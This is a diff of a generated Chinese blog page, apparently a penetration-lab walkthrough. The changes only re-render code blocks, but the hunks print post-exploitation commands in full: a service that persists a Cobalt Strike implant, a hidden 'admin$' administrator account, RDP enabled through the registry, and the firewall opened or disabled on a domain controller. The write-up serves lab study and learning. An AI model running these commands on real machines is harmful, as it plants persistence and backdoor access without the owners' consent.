@@ -32,7 +32,7 @@
     KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
     KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
   </script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 5.4.2"></head>
 
 
 <body>
@@ -291,7 +291,7 @@
 <p><img src="image-20210622201342198.png" alt="image-20210622201342198"></p>
 <p>连上去后，上传一个cs的马到C:/Users/Public/，把shell转移到cs。</p>
 <h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>由于是administrator权限，这里顺便做一个自启动服务的权限维持</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell sc create &quot;aaser&quot; binpath&#x3D; &quot;C:&#x2F;Users&#x2F;Public&#x2F;.klee.exe&quot;</span><br><span class="line">shell sc description &quot;aaser&quot; &quot;description&quot;</span><br><span class="line">shell sc config &quot;aaser&quot; start&#x3D; auto</span><br><span class="line">shell net start &quot;aaser&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell sc create &quot;aaser&quot; binpath= &quot;C:/Users/Public/.klee.exe&quot;</span><br><span class="line">shell sc description &quot;aaser&quot; &quot;description&quot;</span><br><span class="line">shell sc config &quot;aaser&quot; start= auto</span><br><span class="line">shell net start &quot;aaser&quot;</span><br></pre></td></tr></table></figure>
 
 
 
@@ -299,21 +299,21 @@
 
 <h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><h3 id="远程桌面连接"><a href="#远程桌面连接" class="headerlink" title="远程桌面连接"></a>远程桌面连接</h3><ul>
 <li><p>添加影子用户</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net user admin$ 123456abc.. &#x2F;add</span><br><span class="line">shell net localgroup administrators admin$ &#x2F;add</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell net user admin$ 123456abc.. /add</span><br><span class="line">shell net localgroup administrators admin$ /add</span><br></pre></td></tr></table></figure></li>
 <li><p>查询系统是否允许3389远程连接 </p>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; &#x2F;v fDenyTSConnections</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br></pre></td></tr></table></figure>
 <p>1表示关闭，0表示开启</p>
 <ul>
 <li><p>先通过修改注册表来设置一下允许远程桌面连接：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server &quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server &quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure></li>
 <li><p>配置一下防火墙，设置为允许远程桌面连接，命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br></pre></td></tr></table></figure>
 <p>这种时候一般就可以连接上去了</p>
 </li>
 <li><p>关闭防火墙（可选）：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell netsh firewall set opmode disable</span><br><span class="line">shell netsh firewall set opmode mode&#x3D;disable</span><br></pre></td></tr></table></figure></li>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell netsh firewall set opmode disable</span><br><span class="line">shell netsh firewall set opmode mode=disable</span><br></pre></td></tr></table></figure></li>
 </ul>
 <p>后面这块就纯属于自己的学习了，简单的入个门</p>
 <h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><p>用的fscan扫描 ：<a class="link" target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan<i class="fas fa-external-link-alt"></i></a><br>扫描结果</p>
@@ -414,7 +414,7 @@
 <p>域控是这台叫OWA的机器，内网ip为192.168.52.138</p>
 <p><img src="image-20210707150601704.png" alt="image-20210707150601704"></p>
 <p>添加用户，打开3389，关闭防火墙，全套服务走起</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">添加影子用户</span><br><span class="line">shell net user admin$ 123456abc.. &#x2F;add</span><br><span class="line">shell net localgroup administrators admin$ &#x2F;add</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">先通过修改注册表来设置一下允许远程桌面连接：</span><br><span class="line">shell REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server &quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">配置一下防火墙，设置为允许远程桌面连接：</span><br><span class="line">shell netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br><span class="line"></span><br><span class="line">关闭防火墙（可选）</span><br><span class="line">shell netsh firewall set opmode disable</span><br><span class="line">shell netsh firewall set opmode mode&#x3D;disable</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">添加影子用户</span><br><span class="line">shell net user admin$ 123456abc.. /add</span><br><span class="line">shell net localgroup administrators admin$ /add</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">先通过修改注册表来设置一下允许远程桌面连接：</span><br><span class="line">shell REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server &quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">配置一下防火墙，设置为允许远程桌面连接：</span><br><span class="line">shell netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line">关闭防火墙（可选）</span><br><span class="line">shell netsh firewall set opmode disable</span><br><span class="line">shell netsh firewall set opmode mode=disable</span><br></pre></td></tr></table></figure>
 
 
 
